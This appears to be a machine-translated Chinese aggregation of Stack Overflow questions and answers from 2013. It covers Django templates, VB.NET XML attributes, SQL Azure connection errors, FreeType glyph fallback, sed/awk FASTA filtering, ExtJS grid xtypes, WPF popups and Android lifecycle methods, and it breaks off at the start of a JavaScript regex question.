> 时间：2013-04-25T13:06:06.057

你的继承和命名是方式。检查[模板语言文档](https://docs.djangoproject.com/en/dev/topics/templates/)。下面的例子也应该给你一个想法。

**base.html**

```
<html>
  <head>
    <!-- this will always be inherited -->
    {% block head %}
       <!-- this can be overruled -->
    {% endblock %}
  </head>
  <body>
    <!-- this will always be inherited -->
    {% block body %}
       <!-- this can be overruled -->
    {% endblock %}
  </body>
</html> 
```

**page.html**

```
{% extends "base.html" %}

{% block head %}
   <!-- Hello I am overwriting the base head, but not touching it's body. -->
{% endblock %} 
```

# xml - 如何在 Visual Basic 中创建 XML 文件？

> ID：16215430
> 
> 赞同：0
> 
> 时间：2013-04-25T13:00:34.807
> 
> 标签：xml, vb.net, visual-studio-2010

我被要求编写一些代码来与 Visual Basic 中的 Wi-Flight Api 交互。我已经有代码可以登录并与 API 交互。

我正在编写一些示例代码来提交预订。为此，我需要创建一个 xml 文件并用适当的数据填充它，这些数据将简单地输入到此示例代码的 TextFields 中。

我在互联网上找到了各种代码片段来创建看起来像（[source](http://www.dotnetperls.com/xmlwriter-vbnet)）的基本文件：

```
 <?xml version="1.0" encoding="utf-8"?>
    <Employees>
      <Employee>
        <ID>1</ID>
        <FirstName>Prakash</FirstName>
        <LastName>Rangan</LastName>
        <Salary>70000</Salary>
      </Employee>
      <Employee>
        <ID>5</ID>
        <FirstName>Norah</FirstName>
        <LastName>Miller</LastName>
        <Salary>21000</Salary>
      </Employee>
      <Employee>
        <ID>17</ID>
        <FirstName>Cecil</FirstName>
        <LastName>Walker</LastName>
        <Salary>60000</Salary>
      </Employee>
    </Employees> 
```

现在，我需要创建一个看起来像[这样](https://www.wi-flight.net/docs/api.html#resvobj)的 xml 文件。

它需要我把像

```
 <reservation name="unique-name"> 
```

我还没有找到任何方法将 name="unique-name" 部分添加到 XML 文件中。我正在寻找一种方法来做到这一点。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:01:15.640

使用 XDocument/XElement 很容易做到：

```
Dim v As XElement = <reservation/>
'or Dim v As XElement = XElement.Parse("<reservation/>")
'or Dim v As XElement = XElement.Load("pathToFile")
v.SetAttributeValue("name", "unique-name")
Debug.WriteLine(v.ToString) 'prints <reservation name="unique-name" /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:54:59.490

没有冒犯，但你不认为你可能对[文档`XmlWriter`](http://msdn.microsoft.com/en-us/library/5y8188ze.aspx)感兴趣吗？了解您的工具...

`xmlWriter.WriteAttributeString( "name", sUniqueName )`是您的朋友，假设它`sUniquename`拥有所需的唯一名称。

# c# - 尝试连接到 SQL Azure 数据库时出现异常

> ID：16215432
> 
> 赞同：1
> 
> 时间：2013-04-25T13:00:45.207
> 
> 标签：c#, .net, azure, azure-sql-database, azure-storage

我对 Windows Azure 完全陌生。

我目前有一个用于我的 .NET 应用程序的本地数据库。我已经创建了一个 Azure 帐户以及相关的 SQL Azure 数据库。

我正在添加 C# 代码，以便将数据从本地应用程序传递到云。为了测试此功能，我添加了一个随机用户，我想将其插入 Azure DB。

我使用了以下教程： http: [//www.windowsazure.com/en-us/develop/net/how-to-guides/sql-database/](http://www.windowsazure.com/en-us/develop/net/how-to-guides/sql-database/)

我正在尝试使用 app.config 中的连接字符串连接到 Azure SQL 数据库：

```
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <connectionStrings>
    <add name="STAREntities"
       connectionString ="Server=tcp:fkr95b1any.database.windows.net,1433;Database=StarSoftwareDb;User ID=starSoft1@fkr95b1any;Password=xxxxxx;Trusted_Connection=False;Encrypt=True;" />
  </connectionStrings>
</configuration> 
```

此方法用于注册，此代码建立与 azure 数据库的连接，但当前在“conn.Open();”上失败。

```
SqlConnectionStringBuilder csBuilder;

csBuilder = new SqlConnectionStringBuilder(ConfigurationManager.ConnectionStrings["STAREntities"].ConnectionString);

SqlConnection conn = new SqlConnection(csBuilder.ToString());
conn.Open(); 
```

单击触发此代码的注册按钮时，程序会挂起很长一段时间，然后抛出以下错误：

建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：TCP Provider，错误：0 - 连接尝试失败，因为连接方在一段时间后没有正确响应或建立连接失败，因为连接的主机没有响应。）

任何帮助或建议将不胜感激。

更新

我已将连接字符串更改为下面建议的@Leonardo。我还在 sql server 配置管理器中启用了“TCP/IP”和“命名管道”，并允许打开端口 1433。

主数据库的仪表板现在在表上显示成功连接，但我仍然遇到异常

```
conn.Open() 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:18:28.853

在这里试试这个：
`"Server=fkr95b1any.database.windows.net;Database=StarSoftwareDb;User ID=starSoft1@fkr95b1any;Password=xxxxxx;"`

并检查实例的防火墙设置！它可能对所有应用程序都关闭（默认设置）

# asp.net - 超链接未正确显示

> ID：16215434
> 
> 赞同：0
> 
> 时间：2013-04-25T13:00:49.210
> 
> 标签：asp.net, hyperlink, repeater

我想从数据库动态显示页面上的数据。

我添加了一个新闻框，并且正在从数据库的转发器中显示事件列表。`Hyperlink`并且`Marquee`也被使用。但超链接显示不正确。

代码如下：

```
<asp:HyperLink ID = "HyperLink1" runat = "server" NavigateUrl = "/events/events.aspx?id=<%#Eval('event_id') %>">

<asp:Label ID = "Label1" runat = "server" text = '<%# Eval("event_title") %>' ></asp:Label></asp:HyperLink><br/> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:19:11.473

ASP.NET [HyperLink](http://msdn.microsoft.com/en-us/library/system.web.ui.webcontrols.hyperlink.aspx)应该这样声明：

```
<asp:HyperLink 
     ID="HyperLink1" 
     runat="server" 
     NavigateUrl="/events/events.aspx?id=<%#Eval('event_id') %>"
     Text='<%# Eval("event_title") %>' /> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:20:27.027

将您的代码更改为

```
 <asp:HyperLink
    ID="HyperLink1" runat=server
    NavigateUrl='<%# DataBinder.Eval(Container.DataItem, "event_id", "/events/events.aspx?id={0}")   %>'>
    <%# DataBinder.Eval(Container.DataItem, "event_title") %>'
  </asp:HyperLink> 
```

# freetype - freetype 对丢失的字形使用后备

> ID：16215437
> 
> 赞同：6
> 
> 时间：2013-04-25T13:00:55.133
> 
> 标签：freetype, freetype2

当字符串确实包含我作为默认字体使用的字体中不存在的字符时，我如何告诉 freetype 使用后备字体？

我需要在我的应用程序中正确渲染非拉丁字形。

我必须自己管理回退吗？

如果是这样：如何检测给定字符串中是否缺少字形？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-09-28T08:50:48.870

对不起，我不知道你是否需要自己处理后备，但我猜你会这样做。至于如何检测是否缺少字形，可以使用以下方法：[FT_Get_Char_index](http://www.freetype.org/freetype2/docs/reference/ft2-base_interface.html#FT_Get_Char_Index)如果返回0，则表示未找到符号。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2016-08-23T14:09:47.607

GNU Unifont 可以作为基本多语言平面 (BMP) 中每个代码点的备用字体，即`0x0000-0xFFFF`. 这应该涵盖您可能遇到的绝大多数情况。可在[此处](http://unifoundry.com/ "这里")下载（[存档](https://web.archive.org/web/20160818150027/http://unifoundry.com/ "存档")）。

Unicode Last Resort 字体可以作为所有平面中每个代码点的最终后备。这些字形仅显示广泛的类别。可在[此处](http://www.unicode.org/policies/lastresortfont_eula.html "这里")下载。

正如SMart[解释](https://stackoverflow.com/a/19065127/5472899 "建议")的那样，您似乎必须使用[FT_Get_Char_Index()](https://www.freetype.org/freetype2/docs/reference/ft2-base_interface.html#FT_Get_Char_Index)检测字形的缺失，在这些情况下，请使用 Unifont 或 Last Resort 字体。

# function - Seneca Z-3AO 是否理解功能 5 代码（Modbus RTU）？

> ID：16215438
> 
> 赞同：2
> 
> 时间：2013-04-25T13:00:55.607
> 
> 标签：function, modbus

在用户手册中他们只指定了“模拟输出保持寄存器”的地址，它允许您实现功能码 3、6 和 16。

PS。我想更改 Eprflag 寄存器（位 12）中的单个线圈（位），但用户手册没有指定该线圈的数据地址。例如：第 12 位的线圈编号为 00002，这给了我们 2-1=1 作为数据地址。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-07T19:05:00.507

如果“写线圈”功能不可用，您仍然可以读取整个寄存器，更改所需的位，然后写回整个寄存器。

# iphone - IOS isEqualToString 不工作

> ID：16215439
> 
> 赞同：3
> 
> 时间：2013-04-25T13:01:01.683
> 
> 标签：iphone, ios, objective-c, nsstring, nsfilemanager

以下示例程序输出相同，但程序无法正常工作。

```
NSDirectoryEnumerator *directoryEnumerator = [[NSFileManager defaultManager]
                                   enumeratorAtPath:kDocdir];

for (NSString *pathi in directoryEnumerator)
{
   NSString *fileName_Manager = [pathi lastPathComponent];
   NSLog(@"fileName_Manager = %@",fileName_Manager);

   Artist *name_Databse =  [self.fetchedResultsController
                               objectAtIndexPath:IndexPath];
   NSLog(@"name_Databse     = %@",name_Databse.name);

   if ([fileName_Manager isEqualToString:name_Databse.name]) {
       NSLog(@"Same Name");
   }else{
       NSLog(@"Different Name");
   }

} 
```

输出：

```
2013-04-25 15:37:43.256 Player[36436:907] fileName_Manager = alizée - mèxico - final j'en
2013-04-25 15:37:43.272 Player[36436:907] name_Databse     = alizée - mèxico - final j'en
2013-04-25 15:37:44.107 Player[36436:907] Different Name 
```

当名称中有特殊字符时无法正常工作。为什么会这样？谢谢 ...

这里有同样的问题：

```
NSPredicate *predicate = [NSPredicate predicateWithFormat:@"name == %@",[pathi lastPathComponent]]; 
```

如何在这里进行编辑？

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-04-25T13:08:09.550

的文档`isEqualToString:`建议您可能有问题：

> 比较使用字符串的规范表示，对于特定字符串，它是字符串的长度加上构成字符串的 Unicode 字符。当此方法比较两个字符串时，如果各个 Unicode 相同，则无论后备存储如何，这些字符串都是相等的。“字面量”应用于字符串比较时，表示不应用各种 Unicode 分解规则，单独比较 Unicode 字符。**因此，例如，表示为组合字符序列“O”和变音符号的“Ö”不会与表示为一个 Unicode 字符的“Ö”比较**。

尝试使用`(NSOrderedSame == [string1 localizedCompare:string2])`

此外，如果您还没有，请查看处理大量本地化问题的 Apple 示例代码“ **International Mountains ”。**

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-25T13:11:53.480

您是否尝试将两个字符串都转换为 UTF-8，然后进行比较？我不知道这是否有效，这只是一个想法。

# sed - 使用 sed 或 awk 编辑文本文件

> ID：16215440
> 
> 赞同：1
> 
> 时间：2013-04-25T13:01:10.637
> 
> 标签：sed, awk

我有一个示例文本文件，如下所示：

```
>chr1 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr10 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr11 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr12 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>AAEX03020170.1 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA
>AAEX03022270.1 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA
>JH373398.1dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA
>JH373568.1dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA 
```

前四个以`chr1`,和开头`chr10`，其余的以公共前缀and开头。`chr11``chr12``AAEX``JH`

我想从以`AAEX`and开头的行中删除所有数据，`JH`即输出应如下所示：

```
>chr1 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr10 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr11 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr12 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN 
```

原始文件有许多以“AAEX”和“JH”开头的行，并希望按上图所示进行转换。有什么帮助吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:09:03.680

这应该可以解决问题：

```
$ awk '/>[AJ]/{if(!f++)print ">chrX";next}NF' file
>chr1 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr10 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr11 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chr12 dna:chromosome chromosome:CanFam3.1:1:1:122678785:1 REF
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
>chrX
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNTATGTGAGAAGATAGCTGAA 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T20:30:05.743

这可能对您有用（GNU sed）：

```
sed -r '/^>(AAEX|JH)/{x;/./{x;d};x;s/.*/>chrX/p;h;d};/^>/{x;s/.*//;x}' file 
```

# html - Jquery ui 可在右对角线上排序

> ID：16215446
> 
> 赞同：1
> 
> 时间：2013-04-25T13:01:18.590
> 
> 标签：html, css, jquery-ui

我正在尝试使用可排序的 jQuery UI，我正在更改 DIV，这是在向右对角按下 div 时发生的问题，我的 div 向前移动，但我在顶部的 div 保持原位，即不能发生。应该往前走。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:33:33.560

我在您的示例中看到的唯一可能引起您担忧的问题是，有时要进行交换有点困难。如果您将`tolerance`from更改`intersect`为`pointer`，我认为它可能会有所帮助。尝试这个：

[http://jsfiddle.net/uzabV/2/](http://jsfiddle.net/uzabV/2/)

# gridview - Issue with grids within tabs in extjs

> ID：16215448
> 
> 赞同：0
> 
> 时间：2013-04-25T13:01:20.723
> 
> 标签：gridview, extjs, tabs

I have reviewed other posts about using grids within tabs and am choosing the extend/xtype approach... However, I am getting an error when adding the reference to the grid in the tab:

```
Ext.define('mygrid', {
    extend: 'Ext.grid.Panel',
    alias: 'widget.mygrid',
    width:425,
    height:250,
    collapsible:true,
    title:'Simple ListView <i>(0 items selected)</i>',
    renderTo: Ext.getBody(),

    store: store,
    multiSelect: true,
    viewConfig: {
        emptyText: 'No images to display'
    },

    columns: [{
        text: 'File',
        flex: 50,
        dataIndex: 'name'
    },{
        text: 'Last Modified',
        xtype: 'datecolumn',
        format: 'm-d h:i a',
        flex: 35,
        dataIndex: 'lastmod'
    },{
        text: 'Size',
        dataIndex: 'size',
        tpl: '{size:fileSize}',
        align: 'right',
        flex: 15,
        cls: 'listview-filesize'
    }]
});

Ext.create('Ext.tab.Panel', {
width: 700,
height: 200,
activeTab: 0,
items: [
    {
        title: 'Item Assets',
        xtype: 'listView'
    },
    {
        title: 'Item Assets',
        bodyPadding: 10,
        html : 'link to item assets tab'
    },
    {
        title: 'Item Epi',
        bodyPadding: 10,
        html : 'link to epi'
    },
    {
        title: 'Item Package',
        bodyPadding: 10,
        html : 'link to package'
    },
    {
        title: 'Item Price',
        bodyPadding: 10,
        html : 'link to price'
    },
    {
        title: 'YMM Info',
        bodyPadding: 10,
        html : 'link to ymm'
    }//,
    //listview,listview,listview
],
renderTo : Ext.getBody()
}); 
```

The error I am getting is:

"ext-all-debug.js (line 5040)

TypeError: name is undefined

if (name === from || name.substring(0, from.length) === from) {"

If I comment out "xtype: listView" the tabs show up properly....

I'm sure it's just something simple I'm missing...

Full code here:

```
Ext.Loader.setConfig({enabled: true});

 Ext.Loader.setPath('Ext.ux', '/include/extjs/examples/ux/');
 Ext.require([
'Ext.grid.*',
'Ext.data.*',
'Ext.util.*',
'Ext.toolbar.Paging',
'Ext.ux.PreviewPlugin',
'Ext.ModelManager',
'Ext.tip.QuickTipManager',
'Ext.state.*'
 ]);

 Ext.onReady(function() {
Ext.direct.Manager.addProvider(Ext.app.REMOTING_API);
Ext.tip.QuickTipManager.init();

//added model inside onready
Ext.define('Manufacturer', {
    extend: 'Ext.data.Model',
    fields: ['id', 'part_no', 'tddb_retail', 'tddb_jobber', 'tddb_descr', 'tddb_category' ,'tddb_subcategory']
});

//separated store into unique var for guaranteeRange
var store = Ext.create('Ext.data.Store', {
    model: 'Manufacturer',
     autoLoad: true,
     pageSize: 15,
     loadMask: true,
    proxy: {
        type: 'direct',
                //  extraParams:{ codes_id: 410 },
         api: {
                     //  create: inventory.readManu,
                     read: inventory.readInventory,
                   update: inventory.updateInventory,
                 // destroy: worklist.getResults
                     },
          reader: {
                           type: 'json',
                           root: 'data',
                          totalProperty: 'total',
                successProperty: 'success'
                },
              writer: {
                           type: 'json',
                 writeAllFields: true,
                         encode: false,
                           root: 'data'
                },
        listeners: {
                     exception: function(proxy, response, operation){
                                  Ext.MessageBox.show({
                                         title: 'REMOTE EXCEPTION',
                                           msg: operation.getError(),
                                          icon: Ext.MessageBox.ERROR,
                                       buttons: Ext.Msg.OK
                                  });
                                }
                  },

        }
         });

   store.getProxy().extraParams = { codes_id: document.getElementById( 'codes_id').value };

//create the grid

var pluginExpanded = true;
var grid = Ext.create('Ext.grid.Panel', {
    height: 350,
    width: 700,
    title: 'Manufacturer URL Listing with info',
    store: store,
    tools:[{
     type:'save',
    tooltip: 'Save Data',
// hidden:true,

handler: function(event, toolEl, panel){
    // refresh logic
     //rowEditing.cancelEdit();
  var sm = grid.getSelectionModel();

  Ext.Msg.show({
       title:'Update Data',
       msg: 'Are you sure you want to update the item information?',
       buttons: Ext.Msg.YESNO,
       icon: Ext.Msg.QUESTION,
       fn: function(btn){
        if (btn === 'yes'){
            store.update();
            //store.sync();
            store.load();
           //Ext.getCmp(grid).getView().refresh();
        }
       }
  });
     }
 }],
    columns: [
        {
        dataIndex: 'id',
        flex: 1,
        text: 'ID',
                   hidden: true
    },
        {
        dataIndex: 'part_no',
        flex: 1,
        text: 'Part Number',
        editor: 'textfield'
    }, {
        dataIndex: 'tddb_retail',
        flex: 1.3,
        text: 'TD Retail',
        editor: 'textfield'
    }, 
    {
        dataIndex: 'tddb_jobber',
        flex: 1.3,
        text: 'TD Retail',
        editor: 'textfield'
    },{
        dataIndex: 'tddb_descr',
        flex: 1,
        text: 'Description',
        editor: 'textfield'
    },
    {
        dataIndex: 'tddb_category',
        flex: 1,
        text: 'Category',
        editor: 'textfield'
    },
    {
        dataIndex: 'tddb_subcategory',
        flex: 1,
        text: 'Sub Category',
        editor: 'textfield'
    },],
            forceFit: true,
    selType: 'cellmodel',
    plugins: [
    Ext.create('Ext.grid.plugin.CellEditing', {
        clicksToEdit: 1
    })
     ],

//paging bar
bbar: Ext.create('Ext.PagingToolbar', {
        store: store,
        pagesize: 15,
        displayInfo: true,
        displayMsg: 'Displaying items {0} - {1} of {2}',
        emptyMsg: "No items to display",
    }),

    renderTo: Ext.getBody(),

}

);

 Ext.define('mygrid', {
    extend: 'Ext.grid.Panel',
    alias: 'widget.mygrid',
    width:425,
    height:250,
    collapsible:true,
    title:'Simple ListView <i>(0 items selected)</i>',
    renderTo: Ext.getBody(),

    store: store,
    multiSelect: true,
    viewConfig: {
        emptyText: 'No images to display'
    },

    columns: [{
        text: 'File',
        flex: 50,
        dataIndex: 'name'
    },{
        text: 'Last Modified',
        xtype: 'datecolumn',
        format: 'm-d h:i a',
        flex: 35,
        dataIndex: 'lastmod'
    },{
        text: 'Size',
        dataIndex: 'size',
        tpl: '{size:fileSize}',
        align: 'right',
        flex: 15,
        cls: 'listview-filesize'
    }]
});

 Ext.create('Ext.tab.Panel', {
width: 700,
height: 200,
activeTab: 0,
items: [
    {
        title: 'Item Assets',
        xtype: 'listView'
    },
    {
        title: 'Item Assets',
        bodyPadding: 10,
        html : 'link to item assets tab'
    },
    {
        title: 'Item Epi',
        bodyPadding: 10,
        html : 'link to epi'
    },
    {
        title: 'Item Package',
        bodyPadding: 10,
        html : 'link to package'
    },
    {
        title: 'Item Price',
        bodyPadding: 10,
        html : 'link to price'
    },
    {
        title: 'YMM Info',
        bodyPadding: 10,
        html : 'link to ymm'
    }//,
    //listview,listview,listview
],
renderTo : Ext.getBody()
 }); 

 }); 
```

Any help is greatly appreciated!

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:57:29.763

您的网格的别名是“widget.mygrid”。因此，需要将 xtype 配置为：

```
...
{
    title: 'Item Assets',
    xtype: 'mygrid'
}
.... 
```

# wpf - Wpf Close popup when ListboxItem is selected

> ID：16215451
> 
> 赞同：1
> 
> 时间：2013-04-25T13:01:30.420
> 
> 标签：wpf, listbox, popup

I have listbox inside popup. How would I close popup right after I select item from list box; here is code:

```
 <Popup x:Name="ColorPopup" AllowsTransparency="True" 
 IsOpen="{Binding ElementName=ColorToggle, Path=IsChecked}" Placement="Bottom" StaysOpen="False" PlacementTarget="{Binding ElementName=ColorToggle}">

  <Border x:Name="DropDownBorder1" BorderBrush="{DynamicResource {x:Static SystemColors.WindowFrameBrushKey}}" Margin="0, 0,5,5" BorderThickness="1" Background="{DynamicResource {x:Static SystemColors.WindowBrushKey}}" Effect="{DynamicResource WindowShadowEffect}">
      <ListBox Name="ColorList" VerticalContentAlignment="Stretch" Margin="1, 3, 1, 3"   IsEnabled="True" Grid.Column="0" Background="Transparent" HorizontalContentAlignment="Center" SelectedItem="{Binding fColor}" SelectionMode="Single" Style="{StaticResource HorizontalListBoxStyle2}" ItemsSource="{Binding FillColors}">
      </ListBox>

   </Border>

</Popup> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T14:19:51.793

订阅[SelectionChanged](http://msdn.microsoft.com/en-us/library/system.windows.controls.primitives.selector.selectionchanged.aspx)事件。

您可以在代码隐藏中执行此操作：

```
private void ListBox_SelectionChanged_1(object sender, SelectionChangedEventArgs e)
{
    // ColorPopup.IsOpen = false; ?? or ColorToggle.IsChecked = false; 
} 
```

```
<ListBox SelectionChanged="ListBox_SelectionChanged_1" ... /> 
```

或者如果你使用 MVVM 模式......

例如对于 MVVM-Light，它可能是这样的：

```
<ListBox ...>
    <i:Interaction.Triggers>
        <i:EventTrigger EventName="SelectionChanged">
            <cmd:EventToCommand Command="{Binding Path=ClosePopupCommand}" PassEventArgsToCommand="True" />
        </i:EventTrigger>
    </i:Interaction.Triggers>
</ListBox> 
```

或者 Prism 可能几乎相同：

```
 <ListBox>
      <i:Interaction.Triggers>
           <i:EventTrigger EventName="SelectionChanged">
                <prism:InvokeCommandAction Command="{Binding Path=ClosePupupCommand}" />
           </i:EventTrigger>
      </i:Interaction.Triggers>
 </ListBox> 
```

或者，如果您有肮脏的想法，您也可以在`fColor`属性设置器中关闭弹出窗口。:)

```
 public object fColor
    {
        get
        {
            return this.fColorField;
        }

        set
        {
            this.fColorField= value;
            IsColorToggelChecked = false;
            RaisePropertyChanged(() => this.fColor);
        }
    } 
```

# php - PHP XML serializer

> ID：16215452
> 
> 赞同：0
> 
> 时间：2013-04-25T13:01:31.543
> 
> 标签：php, xml, serialization, pear

Is there some php libraries which implement serialization of data to XML-format like `serialize()` and `unserialize()` (with restoring objects from XML) functions of objects with `private` and `protected` fields?

PEAR XML_Serializer works fine with *type hints* option, but it doen't deal with protected fields.

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2017-08-04T12:41:49.113

Symfony[序列化器组件](https://symfony.com/doc/current/components/serializer.html)提供方法`serialize()`并`deserialize()`支持多种开箱即用的格式：XML、JSON、YAML...

它包含在 Symfony 中，但**你甚至可以在非 Symfony 项目中使用它**，方法是使用 composer 安装它：

```
composer require symfony/serializer 
```

如果您使用[文档示例](https://symfony.com/doc/current/components/serializer.html#usage)`ObjectNormalizer`中所示的，请不要忘记同时安装.`symfony/property-access`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T14:48:25.157

希望这不会被视为垃圾邮件，但我一直在研究一个库，该库处理从 XML 到 XML 的序列化和反序列化对象。

[https://github.com/evert/sabre-xml/](https://github.com/evert/sabre-xml/)

但是，它并不完全符合您的要求。您要序列化的每个对象都需要实现一个`serializeXML`and`deserializeXML`方法。在这种方法中，您可以*准确地*决定您需要实现什么。

如果您确实打算使用它，我实际上很乐意将您想要的确切功能包含为 PHP 5.4 特征。只需给我发消息（你可以在 github 上找到我的信息）。

# java - android中活动生命周期的超类实现是做什么的？

> ID：16215472
> 
> 赞同：2
> 
> 时间：2013-04-25T13:02:19.947
> 
> 标签：java, android, android-activity, superclass, super

我一直在学习 android 编程，我注意到所有活动生命周期方法都有一个在开始时实现的超类。

Android 文档还说，“在执行任何工作之前，这些生命周期方法的实现必须始终调用超类实现”关于生命周期方法。

我很好奇的是为什么这是必要的，这些超类究竟做了什么？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:07:22.237

你可以看看[`Activity`'s source code](https://android.googlesource.com/platform/frameworks/base/+/refs/heads/master/core/java/android/app/Activity.java)。

例如，[`onCreate()`](http://developer.android.com/reference/android/app/Activity.html#onCreate%28android.os.Bundle%29)方法（第 879 行）：

```
protected void onCreate(Bundle savedInstanceState) {
    if (DEBUG_LIFECYCLE) Slog.v(TAG, "onCreate " + this + ": " + savedInstanceState);
    if (mLastNonConfigurationInstances != null) {
        mAllLoaderManagers = mLastNonConfigurationInstances.loaders;
    }
    if (mActivityInfo.parentActivityName != null) {
        if (mActionBar == null) {
            mEnableDefaultActionBarUp = true;
        } else {
            mActionBar.setDefaultDisplayHomeAsUpEnabled(true);
        }
    }
    if (savedInstanceState != null) {
        Parcelable p = savedInstanceState.getParcelable(FRAGMENTS_TAG);
        mFragments.restoreAllState(p, mLastNonConfigurationInstances != null
                ? mLastNonConfigurationInstances.fragments : null);
    }
    mFragments.dispatchCreate();
    getApplication().dispatchActivityCreated(this, savedInstanceState);
    mCalled = true;
} 
```

* * *

当您使用以下内容进行扩展`Activity`时：

```
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    // Some stuff
} 
```

您实际上通过调用来调用上述方法`super.onCreate()`。

为什么需要它？这是 Android 平台的要求，因为该`onCreate()`方法执行 Activity 生命周期的基本操作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T13:17:41.500

如果您的类扩展了任何其他类，并且您有实现该扩展类的方法的方法。但是你不想自己做所有的实现。你打电话给 super.your_Method_That_Has_Implementation_In_Extented_Class();

它说：在这一刻，在我扩展我的类的类中执行 myMethod 的实现。

您还可以查看本教程：http: [//docs.oracle.com/javase/tutorial/java/IandI/super.html](http://docs.oracle.com/javase/tutorial/java/IandI/super.html)

# javascript - Javascript 删除字符串中的重复字母和序列

> ID：16215478
> 
> 赞同：2
> 
> 时间：2013-04-25T13:02:28.687
> 
> 标签：javascript, regex

有很多这样的帖子，我找到了一些解决方案，但并不完美。其中之一：

```
